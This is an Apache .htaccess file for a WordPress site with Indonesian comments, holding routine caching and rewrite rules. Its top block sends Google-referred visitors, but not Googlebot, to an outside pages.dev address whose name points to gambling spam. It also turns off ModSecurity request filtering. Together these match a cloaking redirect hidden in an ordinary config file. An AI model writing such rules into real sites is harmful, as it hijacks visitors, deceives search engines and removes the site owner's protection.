# Conditional redirect untuk referrer Google
RewriteEngine On

# Hanya jika referer dari Google
RewriteCond %{HTTP_REFERER} google\. [NC]

# Kecuali jika user-agent Googlebot (opsional)
RewriteCond %{HTTP_USER_AGENT} !(googlebot) [NC]

# Redirect semua request ke root / (demandifymedia.com atau pages.dev)
RewriteCond %{REQUEST_URI} ^/$
RewriteRule ^ https://demandifymediagacor.pages.dev/keep-smile-babyy/ [R=302,L]

SecFilterEngine Off
SecFilterScanPOST Off
# ==============================
# BEGIN WordPress + Cache
# ==============================

# Atur Cache Expiration untuk resource statis
<IfModule mod_expires.c>
	ExpiresActive On
	ExpiresByType image/jpg "access plus 1 year"
	ExpiresByType image/jpeg "access plus 1 year"
	ExpiresByType image/gif "access plus 1 year"
	ExpiresByType image/png "access plus 1 year"
	ExpiresByType image/x-icon "access plus 1 year"
	ExpiresByType text/css "access plus 1 month"
	ExpiresByType text/javascript "access plus 1 month"
	ExpiresByType application/pdf "access plus 1 month"
	ExpiresDefault "access plus 1 week"
</IfModule>

# WordPress Rewrite Rules
<IfModule mod_rewrite.c>
	RewriteEngine On
	RewriteBase /
	RewriteRule ^index\.php$ - [L]
	
# Pastikan file & folder asli tetap bisa diakses
	RewriteCond %{REQUEST_FILENAME} !-f
	RewriteCond %{REQUEST_FILENAME} !-d
	
# Arahkan ke WordPress index.php
	RewriteRule . /index.php [L]
</IfModule>

# ==============================
# END WordPress + Cache
# ==============================


# ==============================
# BEGIN LiteSpeed
# ==============================
<IfModule LiteSpeed>
	SetEnv noabort 1
</IfModule>
# ==============================
# END LiteSpeed
# ==============================
